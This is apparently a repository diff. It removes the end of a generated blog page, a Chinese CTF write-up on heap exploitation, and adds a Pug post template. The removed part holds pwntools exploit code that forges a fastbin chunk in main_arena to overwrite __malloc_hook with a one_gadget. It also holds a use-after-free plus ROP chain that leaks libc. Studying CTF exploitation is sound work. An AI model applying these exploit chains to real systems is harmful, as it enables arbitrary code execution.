-<li><p>字节错位的话，需要合法的size，与fastbin匹配，而我们发现chunk的地址都是0x5xxx…这类的，当然有一定的机率不是，但是总可以存在的。所以可以在main_arena内构造一个chunk。写入0x51这类合法的size。</p>
-<p><img src="unctf和shctf的骚操作pwn\7.png" alt=""></p>
-</li>
-<li><p>然后这里如何覆盖到malloc_hook呢？由于top chunk在main_arena内，我们可以覆盖到malloc_hook附近。比较有意思的是，由于fastbin数组就存在main_arena里，我们可以直接构造xi相应的fastbin chunk。这里构造的就在top chunk上方，并写入合法的size 0x51。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#modify fd' size to main_arena</span></span><br><span class="line">fake_fd = main_arena + <span class="number">0x15</span> - <span class="number">8</span></span><br><span class="line">edit(<span class="number">11</span>, <span class="number">0</span>, p64(fake_fd))</span><br><span class="line">add(<span class="number">3</span>, <span class="string">'\x12'</span>)</span><br><span class="line">      </span><br><span class="line">payload = <span class="string">"\x11\x11\x11"</span>+p64(libc.address+<span class="number">0x3c4b50</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x51</span>)+p64(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>, payload)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>再次的分配就能覆盖top chunk到malloc_hook附近，继续分配就可以覆盖malloc_hook为one_gadget。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#modify top chunk which is in main_arena</span></span><br><span class="line">add(<span class="number">3</span>, p64(<span class="number">0</span>)*<span class="number">2</span>+p64(__malloc_hook<span class="number">-0x10</span>)+p64(<span class="number">0x3c4b78</span>+libc.address)+p64(<span class="number">0x3c4b78</span>+libc.address)+p64(<span class="number">0x3c4b78</span>+libc.address))</span><br><span class="line">add(<span class="number">3</span>,p64(libc.address+<span class="number">0xf1147</span>))</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-<li><p>小结</p>
-<ul>
-<li>这题的妙处在修改main_arena的内容，即可以修改fastbin数组内容，又可以修改top chunk。感觉这种方式很好使，之前没怎么尝试过，以后多试试！！！</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><h5 id="login"><a href="#login" class="headerlink" title="login"></a>login</h5><ul>
-<li><p>程序分析</p>
-<ul>
-<li><p>存在很明显的UAF漏洞</p>
-<p><img src="unctf和shctf的骚操作pwn\8.png" alt=""></p>
-</li>
-<li><p>结构里存在函数指针，且在一定条件下会调</p>
-<p><img src="unctf和shctf的骚操作pwn\9.png" alt=""></p>
-</li>
-<li><p>其实s还有栈溢出，但是又有canary保护，没办法利用。</p>
-</li>
-</ul>
-</li>
-<li><p>利用分析</p>
-<ul>
-<li><p>一直想用那个函数指针调用，而且因为UAF的存在，函数指针可以覆写。</p>
-</li>
-<li><p>但是由于strcmp的问题，没有合适的方法可以触发。比如，我想把参数改写为puts_got，但是需要输入puts的真实地址才能通过strcmp验证，这就扯了，我要是知道还泄露？</p>
-</li>
-<li><p>这里有一个想法，就是我们可以通过strcmp比较的结果给出的不同的输出能够爆破绕过ALSR。</p>
-</li>
-<li><p>但是参考别的WP找到一个更好的绕过方式，那就是综合利用栈溢出和这个函数指针。之前在纯粹的栈溢出中，ROP的方式下<strong>ret</strong>指令，通常可以构成gadgets利用。但是，这条指令不是依赖于函数返回地址的，而是依赖于栈的。简单的说，就是任何时候执行<strong>ret</strong>指令，都可以把栈上的地址作为下一步的执行地址。这里也是用的这个。</p>
-</li>
-<li><p>首先看下，程序保存了一些符号信息，这些地址可以直接拿来绕过</p>
-<p><img src="unctf和shctf的骚操作pwn\10.png" alt=""></p>
-</li>
-<li><p>这里，不在执着于用函数指针去覆，而是用代码片段去覆盖，结合栈溢出的4个size，就可以劫持程序流程。</p>
-<p><img src="unctf和shctf的骚操作pwn\11.png" alt=""></p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<pre><code>  这里为什么用4个pop是因为在栈溢出之后执行chunk里的指针函数时候的栈的布局
-
-  ![](unctf和shctf的骚操作pwn\12.png)
-
-  这样就可以在不覆盖函数返回地址的情况下以ROPd的方式劫持程序流。
-
-* 需要重复利用的时候，只需要将rop返回地址改到程序的正常结束的位置即可。
-
-  ![](unctf和shctf的骚操作pwn\13.png)
-
-  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x88</span>, <span class="string">'tree'</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x88</span>, <span class="string">'back'</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x88</span>, <span class="string">'aaaa'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">puts_str = <span class="number">0x400452</span></span><br><span class="line">pop_4_ret = <span class="number">0x400F2C</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400f33</span></span><br><span class="line">puts_got = <span class="number">0x601FA8</span></span><br><span class="line">puts_plt = <span class="number">0x4006B8</span></span><br><span class="line">ret = <span class="number">0x400C13</span></span><br><span class="line">      </span><br><span class="line">payload = <span class="string">'puts\x00\x00\x00\x00'</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ret)</span><br><span class="line">      </span><br><span class="line">gdb.attach(p, <span class="string">'b* 0x400E04'</span>)</span><br><span class="line">dbg()</span><br><span class="line">      </span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x18</span>, p64(puts_str) + p64(pop_4_ret))</span><br><span class="line">login(<span class="number">1</span>, len(payload), payload)</span><br><span class="line">      </span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure>
-</code></pre><h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><ul>
-<li>rop不仅在stack中，也可以和heap发生反应。</li>
-<li>灵活的利用IO会有别样的效果。</li>
-</ul>
-<h4 id="0x05-学习参考"><a href="#0x05-学习参考" class="headerlink" title="0x05 学习参考"></a>0x05 学习参考</h4><ul>
-<li><a href="http://radishes.top/2019/11/03/2019-11-03-2019shanghai/" target="_blank" rel="noopener">萝卜</a></li>
-<li><a href="https://leeeddin.github.io/UNCTF2019PWN/" target="_blank" rel="noopener">leedin</a></li>
-</ul>
-
-        </div>
-        <div class="post-tool">
-            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
-                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
-            </a>
-        </div>
-        
-        <div class="post-tags">标签：
-            
-            <a href="../../../../tags/pwn-heap/">pwn heap</a>
-            
-        </div>
-        
-    </article>
-    
-    <p>本文代表个人观点，内容仅供参考。若有不恰当之处，望不吝赐教！</p>
-    
-    
-</div>
-<script src="../../../../js/busuanzi.pure.mini.js"></script>
-
-        </div><!-- end #main-->
-    </div><!-- end #body -->
-    <footer class="footer">
-    <div class="footer-inner">
-        <p>
-            <a href="/about" title="关于本站">关于本站</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <!-- 自定义链接 -->
-            <a href="/help" title="help">急救中心</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <a href="/app" title="App下载">App下载</a>
-        </p>
-        <p>
-            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br>
-            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
-            ，主题&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank">JSimple</a>
-            ，作者<a href="https://www.tangkunyin.com" target="_blank">唐先森</a>
-            ，Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
-        </p>
-        
-
-    </div>
-</footer>
-<script src="../../../../js/InsightSearch.js"></script>
-<script src="../../../../js/SimpleCore.js"></script>
-
-</div>
-<div class="fixed-btn">
-    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
-</div>
-<script>
-    $(function () {
-        SimpleCore.init({
-            buildingTime: '11/22/2018',
-            current: $('.post-tags').length > 0 ? 'post' : 'archive',
-            snsQRCode: '/images/sns-qrcode.png',
-            donateImg: '/images/donate-qr.png',
-        });
-    });
-</script>
-</body>
-</html>
+block content
+  article#post(class="")
+    if (!top_img)
+      #post-title.plain= page.title || _p('no_title')
+      #post-meta
+        if (theme.post_meta.date_type)
+          - var date_type = theme.post_meta.date_type === 'updated' ? '' : 'date'
+          time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+        if (theme.post_meta.categories && page.categories.data.length > 0)
+          if (theme.post_meta.date_type)
+            span.post-meta__separator |
+          each item, index in page.categories.data
+            i.fa.fa-inbox(aria-hidden="true")
+            a(href=url_for(item.path)).post-meta__categories  #[=item.name]
+            if (index < page.categories.data.length - 1)
+                i.fa.fa-angle-right.post-meta__separator(aria-hidden="true")
+        if (theme.disqus.enable && theme.disqus.count)
+          if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+            span.post-meta__separator |
+          i.fa.fa-comment-o(aria-hidden="true")
+          a(href=url_for(page.path) + '#disqus_thread')
+            span.disqus-comment-count(data-disqus-identifier=page.path)
+        if (theme.wordcount && theme.wordcount.enable)
+          span.post-meta__separator |
+          span.post-meta-wordcount
+            span= _p('post.wordcount') + ': '
+            span.word-count= wordcount(page.content)
+            span.post-meta__separator |
+            span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+    #post-content.article-container!= page.content
+  if (theme.post_copyright && theme.post_copyright.enable)
+    .post-copyright
+      .post-copyright__author
+        span.post-copyright-meta= _p('post.copyright.author') + ": "
+        span.post-copyright-info
+          a(href=`mailto:${config.email}`) #[=config.author]
+      .post-copyright__type
+        span.post-copyright-meta= _p('post.copyright.link') + ": "
+        span.post-copyright-info
+          a(href=url_for(page.permalink)) #[=page.permalink]
+      .post-copyright__notice
+        span.post-copyright-meta= _p('post.copyright.copyright_notice') + ": "
+        span.post-copyright-info!= _p('post.copyright.copyright_content', theme.post_copyright.license_url, theme.post_copyright.license, config.url, config.title)
+  if (theme.post_meta.tags)
+    .post-meta__tag-list
+      each item, index in page.tags.data
+        a(href=url_for(item.path)).post-meta__tags #[=item.name]
+  if (theme.QR_code)
+    if (theme.QR_code.length > 0)
+      .post-qr-code
+        each item in theme.QR_code
+          .post-qr-code-item
+            img.post-qr-code__img(src=(item.itemlist||item).img)
+            .post-qr-code__desc=(item.itemlist||item).text
+  include includes/share/index.pug
+  include includes/pagination.pug
+  if (theme.adv && theme.adv.enable)
+    .post-adv!= theme.adv.info
+  if page.comments !== false
+    include includes/comments/index.pug
